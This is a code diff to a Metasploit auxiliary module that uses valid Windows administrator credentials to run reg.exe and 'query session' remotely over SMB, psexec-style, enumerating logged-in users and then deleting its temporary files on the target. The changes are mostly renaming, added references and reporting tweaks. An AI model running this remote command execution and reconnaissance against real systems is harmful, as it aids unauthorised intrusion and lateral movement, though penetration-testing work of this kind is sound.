@@ -17,17 +17,21 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'        => 'SMB - Query Logged On Users',
+			'Name'        => 'Microsoft Windows Authenticated Logged In Users Enumeration',
 			'Description' => %Q{
-				This module authenticates to a remote host or hosts and determines which users are 
-				currently logged in.  It uses reg.exe to query the HKU base registry key.
+					This module uses a valid administrator username and password to enumerate users
+				currently logged in, using a similar technique than the "psexec" utility provided
+				by SysInternals. It uses reg.exe to query the HKU base registry key.
 			},
 			'Author'      =>
 				[
-					'Royce Davis @R3dy__ <rdavis[at]accuvant.com>'    # Metasploit module
+					'Royce Davis @R3dy__ <rdavis[at]accuvant.com>' # Metasploit module
 				],
 			'References'  => [
-				['URL', 'http://www.pentestgeek.com/2012/11/05/finding-logged-in-users-metasploit-module/']
+				[ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
+				[ 'OSVDB', '3106'],
+				[ 'URL', 'http://www.pentestgeek.com/2012/11/05/finding-logged-in-users-metasploit-module/' ],
+				[ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
 			],
 			'License'     => MSF_LICENSE
 		)
@@ -41,13 +45,9 @@ class Metasploit3 < Msf::Auxiliary
 		deregister_options('RHOST')
 	end
 
-
-
 	def peer
 		return "#{rhost}:#{rport}"
 	end
-
-
 
 	# This is the main controller function
 	def run_host(ip)
@@ -67,18 +67,16 @@ class Metasploit3 < Msf::Auxiliary
 
 		keys = get_hku(ip, smbshare, cmd, text, bat)
 		if !keys
-			cleanup_after(smbshare, ip, cmd, text, bat)
+			cleanup_after(cmd, text, bat)
 			disconnect
 			return
 		end
 		keys.each do |key|
 			check_hku_entry(key, ip, smbshare, cmd, text, bat)
 		end
-		cleanup_after(smbshare, ip, cmd, text, bat)
+		cleanup_after(cmd, text, bat)
 		disconnect
 	end
-
-
 
 	# This method runs reg.exe query HKU to get a list of each key within the HKU master key
 	# Returns an array object
@@ -97,8 +95,6 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
-
-
 	# This method will retrive output from a specified textfile on the remote host
 	def get_output(ip, smbshare, file)
 		begin
@@ -114,19 +110,17 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
-
-	
 	def report_user(username)
-		report_note = {
+		report_note(
 			:host => rhost,
 			:proto => 'tcp',
+			:sname => 'smb',
 			:port => rport,
-			:type => 'loggedin users',
-			:data => username
-		}
+			:type => 'smb.domain.loggedusers',
+			:data => "#{username} is logged in",
+			:update => :unique_data
+		)
 	end
-
-
 
 	# This method checks a provided HKU entry to determine if it is a valid SID
 	# Either returns nil or returns the name of a valid user
@@ -144,7 +138,7 @@ class Metasploit3 < Msf::Auxiliary
 						domain = line if line.include?("USERDOMAIN")
 					end
 					if domain.split(" ")[2].to_s.chomp + "\\" + username.split(" ")[2].to_s.chomp == datastore['USERNAME']
-						print_good("#{datastore['USERNAME']} is logged into #{peer}")
+						print_good("#{peer} - #{datastore['USERNAME']} is logged in")
 						report_user(datastore['USERNAME'])
 					end
 					return
@@ -159,7 +153,7 @@ class Metasploit3 < Msf::Auxiliary
 				if username.length > 0 && domain.length > 0
 					user = domain.split(" ")[2].to_s + "\\" + username.split(" ")[2].to_s
 					print_good("#{peer} - #{user}")
-					report_user(user)
+					report_user(user.chomp)
 				elsif logonserver.length > 0 && homepath.length > 0
 					uname = homepath.split('\\')[homepath.split('\\').size - 1]
 					if uname.include?(".")
@@ -167,12 +161,12 @@ class Metasploit3 < Msf::Auxiliary
 					end
 					user = logonserver.split('\\\\')[1].chomp.to_s + "\\" + uname.to_s
 					print_good("#{peer} - #{user}")
-					report_user(user)
+					report_user(user.chomp)
 				else
 					if username = query_session(smbshare, ip, cmd, text, bat)
 						user = dnsdomain.split(" ")[2].split(".")[0].to_s + "\\" + username.to_s
 						print_good("#{peer} - #{user}")
-						report_user(user)
+						report_user(user.chomp)
 					else
 						print_status("#{peer} - Unable to determine user information for user: #{key}")
 					end
@@ -186,22 +180,20 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
-
-
 	# Cleanup module.  Gets rid of .txt and .bat files created in the WINDOWS\Temp directory
-	def cleanup_after(smbshare, ip, cmd, text, bat)
+	def cleanup_after(cmd, text, bat)
 		begin
 			# Try and do cleanup command
 			cleanup = "#{cmd} /C del C:#{text} & del #{bat}"
-			print_status("Executing cleanup on host: #{peer}")
+			print_status("#{peer} - Executing cleanup")
 			out = psexec(cleanup)
 		rescue StandardError => cleanuperror
-			print_error("Unable to processes cleanup commands: #{cleanuperror}")
+			print_error("#{peer} - Unable to processes cleanup commands: #{cleanuperror}")
+			print_warning("#{peer} - Maybe C:#{text} must be deleted manually")
+			print_warning("#{peer} - Maybe #{bat} must be deleted manually")
 			return cleanuperror
 		end
 	end
-
-
 
 	# Method trys to use "query session" to determine logged in user
 	def query_session(smbshare, ip, cmd, text, bat)
@@ -219,8 +211,6 @@ class Metasploit3 < Msf::Auxiliary
 			return nil
 		end
 	end
-
-
 
 	# This code was stolen straight out of psexec.rb.  Thanks very much HDM and all who contributed to that module!!
 	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
